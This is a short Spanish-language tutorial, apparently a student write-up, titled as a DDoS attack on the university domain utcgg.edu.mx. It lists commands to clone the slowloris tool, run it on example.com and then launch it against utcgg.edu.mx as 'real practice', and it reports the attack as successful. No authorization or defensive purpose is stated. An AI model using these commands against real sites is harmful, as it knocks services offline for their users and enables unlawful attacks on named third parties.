Ataque Ddos a la pagina utcgg.edu.mx


Entrar a la Terminal Git bash

Una vez estando en git escribir el siguiente comando

1.- Copiamos el repositorio de GitHub
git clone https://github.com/gkbrk/slowloris.git

2.- Entramos al el archivo descargado.
cd slowloris

3.- Teoría de la ejecución
python3 slowloris.py example.com

4.- Practica real de la ejecución
python3 slowloris.py utcgg.edu.mx


Empezó el arranque de Slowloris



La imagen nos narra que se están creando 150 conexiones


Después de unos momentos el programa habrá creado muchas conexiones haciendo el ataque Ddos exitoso
